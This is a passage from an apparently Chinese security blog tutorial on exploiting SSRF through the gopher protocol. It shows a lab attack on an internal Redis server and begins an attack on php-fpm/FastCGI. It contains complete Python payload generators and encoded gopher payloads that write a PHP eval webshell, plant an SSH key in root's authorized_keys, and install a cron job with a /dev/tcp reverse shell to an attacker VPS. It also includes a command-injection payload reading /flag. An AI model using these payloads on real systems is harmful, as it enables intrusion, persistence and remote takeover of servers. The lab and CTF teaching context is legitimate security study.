class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>同样将Welcome后面表示对象属性个数的“1”改为“2”绕过<code>__destruct()</code>的限制后执行：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202364.jpeg\"\n                        alt=\"image-20200921135622488\"\n                 ></p>\n<p>如上图，命令执行成功。</p>\n<p><strong>注意：</strong>这里要注意的是，我们发送的是POST包，而如果发送的是GET包的话，当这个URL经过服务器时，payload部分会被自动url解码，%20等字符又会被转码为空格。所以，curl_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要对payload进行二次URL编码。编码结果类似如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher%3a%2f%2f127.0.0.1%3a80%2f\\_POST%2520%2ftool.php%2520HTTP%2f1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2fflag%250D%250A</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"攻击内网Redis\"><a href=\"#攻击内网Redis\" class=\"headerlink\" title=\"攻击内网Redis\"></a>攻击内网Redis</h2><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598023_5fffc6877d72429d2cbae.png!small\"\n                        alt=\"20210113151633.png\"\n                 ></p>\n<p>Redis是数据库的意思。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>\n<blockquote>\n<p><strong>什么是Redis未授权访问？</strong></p>\n<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>\n<p>简单说，漏洞的产生条件有以下两点：</p>\n<ul>\n<li><p>redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</p>\n</li>\n<li><p>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</p>\n</li>\n</ul>\n</blockquote>\n<p>在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等，其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~&#x2F;.ssh目录或&#x2F;var&#x2F;spool&#x2F;cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。</p>\n<p>下面我们对攻击Redis的手法进行演示。测试环境如下，内网中其他主机均有外网IP并可以上网：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202356.jpeg\"\n                        alt=\"image-20210113190430425\"\n                 ></p>\n<p>在上文扫描内网端口的实验中，我们发现了内网中有一个IP为192.168.52.131的主机在6379端口上运行着一个Redis服务，下面我们就用它来演示，通过Ubuntu服务器上的SSRF漏洞去攻击内网主机（192.168.52.131）的Redis。</p>\n<h3 id=\"绝对路径写WebShell\"><a href=\"#绝对路径写WebShell\" class=\"headerlink\" title=\"绝对路径写WebShell\"></a>绝对路径写WebShell</h3><p>首先构造redis命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flushall  </span><br><span class=\"line\">set 1 &#x27;&lt;?php eval($\\_POST\\[&quot;whoami&quot;\\]);?&gt;&#x27;  </span><br><span class=\"line\">config set dir /var/www/html  </span><br><span class=\"line\">config set dbfilename shell.php  </span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n\n<p>然后写一个脚本，将其转化为Gopher协议的格式（脚本时从网上嫖的，谁让我菜呢~~~大佬勿喷）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib</span><br><span class=\"line\">protocol=&quot;gopher://&quot;</span><br><span class=\"line\">ip=&quot;192.168.52.131&quot;</span><br><span class=\"line\">port=&quot;6379&quot;</span><br><span class=\"line\">shell=&quot;\\\\n\\\\n&lt;?php eval($\\_POST\\[\\\\&quot;whoami\\\\&quot;\\]);?&gt;\\\\n\\\\n&quot;</span><br><span class=\"line\">filename=&quot;shell.php&quot;</span><br><span class=\"line\">path=&quot;/var/www/html&quot;</span><br><span class=\"line\">passwd=&quot;&quot;</span><br><span class=\"line\">cmd=\\[&quot;flushall&quot;,</span><br><span class=\"line\">\t &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class=\"line\">\t &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class=\"line\">\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class=\"line\">\t &quot;save&quot;</span><br><span class=\"line\">\t \\]</span><br><span class=\"line\">if passwd:</span><br><span class=\"line\">\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class=\"line\">payload=protocol+ip+&quot;:&quot;+port+&quot;/\\_&quot;</span><br><span class=\"line\">def redis\\_format(arr):</span><br><span class=\"line\">\tCRLF=&quot;\\\\r\\\\n&quot;</span><br><span class=\"line\">\tredis\\_arr = arr.split(&quot; &quot;)</span><br><span class=\"line\">\tcmd=&quot;&quot;</span><br><span class=\"line\">\tcmd+=&quot;\\*&quot;+str(len(redis\\_arr))</span><br><span class=\"line\">\tfor x in redis\\_arr:</span><br><span class=\"line\">\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class=\"line\">\tcmd+=CRLF</span><br><span class=\"line\">\treturn cmd</span><br><span class=\"line\"></span><br><span class=\"line\">if \\_\\_name\\_\\_==&quot;\\_\\_main\\_\\_&quot;:</span><br><span class=\"line\">\tfor x in cmd:</span><br><span class=\"line\">\t\tpayload += urllib.quote(redis\\_format(x))</span><br><span class=\"line\">\tprint payload</span><br></pre></td></tr></table></figure>\n\n<p>执行后生成paylaod如下：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202688.jpeg\"\n                        alt=\"image-20210113175116867\"\n                 ></p>\n<p>这里将生成的payload要进行url二次编码（因为我们发送payload用的是GET方法），然后利用Ubuntu服务器上的SSRF漏洞，将二次编码后的payload打过去就行了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524\\_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure>\n\n<p>如下所示，成功在主机192.168.52.131上面写入WebShell：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598027_5fffc68b3b060b67168e8.png!small\"\n                        alt=\"image-20210113185919592\"\n                 ></p>\n<h3 id=\"写SSH公钥\"><a href=\"#写SSH公钥\" class=\"headerlink\" title=\"写SSH公钥\"></a>写SSH公钥</h3><p>同样，我们也可以直接这个存在Redis未授权的主机的<del>&#x2F;.ssh目录下写入SSH公钥，直接实现免密登录，但前提是</del>&#x2F;.ssh目录存在，如果不存在我们可以写入计划任务来创建该目录。</p>\n<p>构造redis命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flushall  </span><br><span class=\"line\">set 1 &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami  </span><br><span class=\"line\">&#x27;  </span><br><span class=\"line\">config set dir /root/.ssh/  </span><br><span class=\"line\">config set dbfilename authorized\\_keys  </span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n\n<p>然后编写脚本，将其转化为Gopher协议的格式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib</span><br><span class=\"line\">protocol=&quot;gopher://&quot;</span><br><span class=\"line\">ip=&quot;192.168.52.131&quot;</span><br><span class=\"line\">port=&quot;6379&quot;</span><br><span class=\"line\">ssh\\_pub=&quot;\\\\n\\\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\\\\n\\\\n&quot;</span><br><span class=\"line\">filename=&quot;authorized\\_keys&quot;</span><br><span class=\"line\">path=&quot;/root/.ssh/&quot;</span><br><span class=\"line\">passwd=&quot;&quot;</span><br><span class=\"line\">cmd=\\[&quot;flushall&quot;,</span><br><span class=\"line\">\t &quot;set 1 &#123;&#125;&quot;.format(ssh\\_pub.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class=\"line\">\t &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class=\"line\">\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class=\"line\">\t &quot;save&quot;</span><br><span class=\"line\">\t \\]</span><br><span class=\"line\">if passwd:</span><br><span class=\"line\">\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class=\"line\">payload=protocol+ip+&quot;:&quot;+port+&quot;/\\_&quot;</span><br><span class=\"line\">def redis\\_format(arr):</span><br><span class=\"line\">\tCRLF=&quot;\\\\r\\\\n&quot;</span><br><span class=\"line\">\tredis\\_arr = arr.split(&quot; &quot;)</span><br><span class=\"line\">\tcmd=&quot;&quot;</span><br><span class=\"line\">\tcmd+=&quot;\\*&quot;+str(len(redis\\_arr))</span><br><span class=\"line\">\tfor x in redis\\_arr:</span><br><span class=\"line\">\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class=\"line\">\tcmd+=CRLF</span><br><span class=\"line\">\treturn cmd</span><br><span class=\"line\"></span><br><span class=\"line\">if \\_\\_name\\_\\_==&quot;\\_\\_main\\_\\_&quot;:</span><br><span class=\"line\">\tfor x in cmd:</span><br><span class=\"line\">\t\tpayload += urllib.quote(redis\\_format(x))</span><br><span class=\"line\">\tprint payload</span><br></pre></td></tr></table></figure>\n\n<p>生成的payload同样进行url二次编码，然后利用Ubuntu服务器上的SSRF打过去：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524568%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E%2F45IEs%2F9a6AWfXb6iwzo%252BD62y8MOmt%252Bsct27ZxGOcRR95FT6zrfFxqt2h56oLwml%2FTrxy5sExSQ%2FcvvLwUTWb3ntJYyh2eGkQnOf2d%252Bax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH%2F4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd%2FbWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ%2FNnHKyWtI%2FOzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe%252BXqQnjxtk4giopiFfRu8winE9scqlIA5Iu%2Fd3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg%2FOOhoA3iKNhJ%2FJT31TU9E24dGh2Ei8K%252BPpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl%252BSOsVHpNqwFcrgsq%2FWR5BGqnu54vTTdJh0pSrl%252BtniHEnWWU%253D%2520root%2540whoami%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized\\_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure>\n\n<p>如下图，成功在主机192.168.52.131上面写入SSH公钥：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598028_5fffc68c0f8d37e46a560.png!small\"\n                        alt=\"image-20210113185745287\"\n                 ></p>\n<p>如下图，ssh连接成功：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598029_5fffc68d802a6e5c757d2.png!small\"\n                        alt=\"image-20210113193746288\"\n                 ></p>\n<h3 id=\"创建计划任务反弹Shell\"><a href=\"#创建计划任务反弹Shell\" class=\"headerlink\" title=\"创建计划任务反弹Shell\"></a>创建计划任务反弹Shell</h3><p><strong>注意：这个只能在Centos上使用，别的不行，好像是由于权限的问题。</strong></p>\n<p>构造redis的命令如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flushall  </span><br><span class=\"line\">set 1 &#x27;\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1\\\\n\\\\n&#x27;  </span><br><span class=\"line\">config set dir /var/spool/cron/  </span><br><span class=\"line\">config set dbfilename root  </span><br><span class=\"line\">save  </span><br><span class=\"line\"></span><br><span class=\"line\">// 47.xxx.xxx.72为攻击者vps的IP</span><br><span class=\"line\"></span><br><span class=\"line\">然后编写脚本，将其转化为Gopher协议的格式：</span><br><span class=\"line\"></span><br><span class=\"line\">import urllib</span><br><span class=\"line\">protocol=&quot;gopher://&quot;</span><br><span class=\"line\">ip=&quot;192.168.52.131&quot;</span><br><span class=\"line\">port=&quot;6379&quot;</span><br><span class=\"line\">reverse\\_ip=&quot;47.xxx.xxx.72&quot;</span><br><span class=\"line\">reverse\\_port=&quot;2333&quot;</span><br><span class=\"line\">cron=&quot;\\\\n\\\\n\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\\\\n\\\\n\\\\n\\\\n&quot;%(reverse\\_ip,reverse\\_port)</span><br><span class=\"line\">filename=&quot;root&quot;</span><br><span class=\"line\">path=&quot;/var/spool/cron&quot;</span><br><span class=\"line\">passwd=&quot;&quot;</span><br><span class=\"line\">cmd=\\[&quot;flushall&quot;,</span><br><span class=\"line\">\t &quot;set 1 &#123;&#125;&quot;.format(cron.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class=\"line\">\t &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class=\"line\">\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class=\"line\">\t &quot;save&quot;</span><br><span class=\"line\">\t \\]</span><br><span class=\"line\">if passwd:</span><br><span class=\"line\">\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class=\"line\">payload=protocol+ip+&quot;:&quot;+port+&quot;/\\_&quot;</span><br><span class=\"line\">def redis\\_format(arr):</span><br><span class=\"line\">\tCRLF=&quot;\\\\r\\\\n&quot;</span><br><span class=\"line\">\tredis\\_arr = arr.split(&quot; &quot;)</span><br><span class=\"line\">\tcmd=&quot;&quot;</span><br><span class=\"line\">\tcmd+=&quot;\\*&quot;+str(len(redis\\_arr))</span><br><span class=\"line\">\tfor x in redis\\_arr:</span><br><span class=\"line\">\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class=\"line\">\tcmd+=CRLF</span><br><span class=\"line\">\treturn cmd</span><br><span class=\"line\"></span><br><span class=\"line\">if \\_\\_name\\_\\_==&quot;\\_\\_main\\_\\_&quot;:</span><br><span class=\"line\">\tfor x in cmd:</span><br><span class=\"line\">\t\tpayload += urllib.quote(redis\\_format(x))</span><br><span class=\"line\">\tprint payload</span><br></pre></td></tr></table></figure>\n\n<p>生成的payload同样进行url二次编码，然后利用Ubuntu服务器上的SSRF打过去，即可在目标主机192.168.52.131上写入计划任务，等到时间后，攻击者vps上就会获得目标主机的shell：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202362.jpeg\"\n                        alt=\"image-20210113184927766\"\n                 ></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/qq_45521281/article/details/106532501\" >[GKCTF2020]EZ三剑客-EzWeb<i class=\"fas fa-external-link-alt\"></i></a>这道题利用的就是攻击内网Redis的思路。</p>\n<h2 id=\"攻击内网FastCGI\"><a href=\"#攻击内网FastCGI\" class=\"headerlink\" title=\"攻击内网FastCGI\"></a>攻击内网FastCGI</h2><p>FastCGI指快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。</p>\n<blockquote>\n<p>众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要<strong>通过浏览器进行解析</strong>，而动态网站需要一个<strong>额外的编译解析</strong>的过程。以Apache为例，当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，Web容器就会把这个请求进行简单的处理，然后如果使用的是CGI，就会启动CGI程序（对应的就是PHP解释器）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。</p>\n<p>这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它<strong>像一个常驻的CGI</strong>，在启动后会一直运行着，不需要每次处理数据时都启动一次，<strong>所以FastCGI的主要行为是将CGI解释器进程保持在内存中</strong>，并因此获得较高的性能 。</p>\n</blockquote>\n<h3 id=\"php-fpm\"><a href=\"#php-fpm\" class=\"headerlink\" title=\"php-fpm\"></a>php-fpm</h3><p>FPM（FastCGI 进程管理器）可以说是FastCGI的一个具体实现，用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。</p>\n<p>攻击FastCGI的主要原理就是，在设置环境变量实际请求中会出现一个<code>SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php</code>这样的键值对，它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。</p>\n<p>而在PHP 5.3.9后来的版本中，PHP增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在PHP允许通过PHP_ADMIN_VALUE和PHP_VALUE去动态修改PHP的设置。</p>\n<p>那么当设置PHP环境变量为：<code>auto_prepend_file = php://input;allow_url_include = On</code>时，就会在执行PHP脚本之前包含环境变量<code>auto_prepend_file</code>所指向的文件内容，<code>php://input</code>也就是接收POST的内容，这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。</p>\n<p>详情请见：<a class=\"link\"   href=\"https://bbs.ichunqiu.com/thread-58455-1-1.html\" >《SSRF系列之攻击FastCGI》<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>测试环境：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202250.jpeg\"\n                        alt=\"image-20210113225311760\"\n                 ></p>\n<p>WEB服务器Ubuntu（192.168.43.166）存在SSRF漏洞：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598034_5fffc69243862a502d80a.png!small\"\n                        alt=\"image-20210113211319025\"\n                 ></p>\n<p>并且WEB服务器Ubuntu上存在FastCGI，那么我们就可以利用其SSRF漏洞去攻击其本地的FastCGI。</p>\n<blockquote>\n<p>假设在配置fpm时，将监听的地址设为了0.0.0.0:9000，那么就会产生php-fpm未授权访问漏洞，此时攻击者可以无需利用SSRF从服务器本地访问的特性，直接与服务器9000端口上的php-fpm进行通信，进而可以用fcgi_exp等工具去攻击服务器上的php-fpm实现任意代码执行。</p>\n<p>当内网中的其他主机上配置有fpm，且监听的地址为0.0.0.0:9000时，那么这台主机就可能存在php-fpm未授权访问漏洞，我们便可以利用Ubuntu服务器上的SSRF去攻击他，如果内网中的这台主机不存在php-fpm未授权访问漏洞，那么就直接利用Ubuntu服务器上的SSRF去攻击他显然是不行的。</p>\n</blockquote>\n<h3 id=\"使用fcgi-exp工具攻击\"><a href=\"#使用fcgi-exp工具攻击\" class=\"headerlink\" title=\"使用fcgi_exp工具攻击\"></a>使用fcgi_exp工具攻击</h3><p>下载地址：<a class=\"link\"   href=\"https://github.com/piaca/fcgi_exp\" >https://github.com/piaca/fcgi_exp<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>这个工具主要是用来攻击未授权访问php-fpm的，可用来测试是否可以直接攻击php-fpm，但需要自己将生成的payload进行转换一下。</p>\n<p>该工具需要go语言环境，下载后进入目录执行如下命令进行编译：</p>\n<p>go build fcgi_exp.go                    # 编译fcgi_exp.go</p>\n<p>编译完成后，我们在攻击机上使用<code>nc -lvvp 2333 &gt; fcg_exp.txt</code>监听2333 端口来接收fcgi_exp生成的payload，另外再开启一个终端使用下面的命令来向2333端口发送payload：</p>\n<p>.&#x2F;fcgi_exp system 127.0.0.1 2333 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php “id”</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202135.jpeg\"\n                        alt=\"image-20210113205718209\"\n                 ></p>\n<p>生成的fcg_exp.txt文件的内容是接收到的payload，内容如下：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598036_5fffc694cc3e3da7a21ec.png!small\"\n                        alt=\"image-20210113205857913\"\n                 ></p>\n<p>然后对fcg_exp.txt文件里的payload进行url编码，这里通过如下脚本实现（脚本是我从网上白嫖的嘿嘿）：</p>\n<p># -*- coding: UTF-8 -*-<br>from urllib.parse import quote, unquote, urlencode  </p>\n<p>file &#x3D; 